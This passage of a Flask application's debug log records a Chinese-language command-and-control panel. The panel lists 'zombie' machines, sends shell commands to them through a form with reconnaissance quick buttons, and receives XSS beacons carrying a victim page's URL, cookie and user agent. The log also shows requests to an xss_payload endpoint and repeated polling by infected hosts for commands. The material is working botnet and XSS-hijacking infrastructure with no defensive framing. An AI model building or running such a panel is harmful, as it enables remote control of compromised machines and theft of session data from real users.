document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-25 21:09:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:09:30] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-25 21:09:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:09:30] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-25 21:09:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:09:30] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-25 21:10:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 21:10:47 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 21:10:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 21:10:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:10:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 21:10:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 21:10:48 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 21:10:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 21:10:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:10:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 21:10:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-25 21:10:49 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-25 21:10:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0001s) -> 回傳: <Response 2461 bytes [200 OK]>
2025-06-25 21:10:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:10:49] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-25 21:10:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-25 21:10:49 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-25 21:10:49 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","hostname":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-25T13:10:49.879Z"}', None, '2025-06-25 21:10:49.884743', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-25 21:10:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0036s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-25 21:10:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:10:49] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-25 21:10:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-25 21:10:49 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-25 21:10:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0015s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;target_ip&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-25T03:25:06.035Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-25 11:25:06.039456</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-25 21:10:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:10:49] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-25 21:10:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 21:10:54 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 21:10:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 21:10:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:10:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 21:11:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 21:11:00 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 21:11:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 21:11:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:11:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 21:11:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-25 21:11:08 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-25 21:11:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 76 bytes [200 OK]>
2025-06-25 21:11:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:11:08] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-25 21:11:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-25 21:11:13 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-25 21:11:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 76 bytes [200 OK]>
2025-06-25 21:11:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:11:13] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-25 21:11:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-25 21:11:14 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-25 21:11:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 76 bytes [200 OK]>
2025-06-25 21:11:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:11:14] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-25 21:11:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-25 21:11:15 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-25 21:11:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0004s) -> 回傳: <Response 76 bytes [200 OK]>
2025-06-25 21:11:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:11:15] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-25 21:15:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 21:15:37 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 21:15:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 21:15:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:15:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 21:15:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-25 21:15:58 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-25 21:15:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 76 bytes [200 OK]>
2025-06-25 21:15:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:15:58] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-25 21:15:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-25 21:15:59 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-25 21:15:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 76 bytes [200 OK]>
2025-06-25 21:15:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:15:59] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-25 21:16:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:16:05] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-25 21:20:28 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 21:20:28 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 21:20:28 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 21:20:28 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 21:20:28 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 21:20:28 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 21:20:28 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 21:20:28 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 21:20:28 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-25 21:20:58 | ERROR    | start_flaresolverr.py:122 | start_flaresolverr() | FlareSolverr 啟動超時
2025-06-25 21:20:58 | INFO     | start_flaresolverr.py:249 | stop_monitoring() | FlareSolverr 監控已停止
2025-06-25 21:20:58 | INFO     | start_flaresolverr.py:148 | stop_flaresolverr() | 正在停止 FlareSolverr 進程 (PID: 17051)
2025-06-25 21:20:58 | INFO     | start_flaresolverr.py:158 | stop_flaresolverr() | FlareSolverr 已停止
2025-06-25 21:20:58 | WARNING  | app.py:236 | create_app() | ⚠️ FlareSolverr 服務啟動失敗，但應用將繼續運行
2025-06-25 21:20:58 | WARNING  | app.py:236 | create_app() | ⚠️ FlareSolverr 服務啟動失敗，但應用將繼續運行
2025-06-25 21:20:58 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-25 21:20:58 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-25 21:21:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-25 21:21:01 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-25 21:21:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0287s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;target_ip&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-25T03:25:06.035Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-25 11:25:06.039456</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        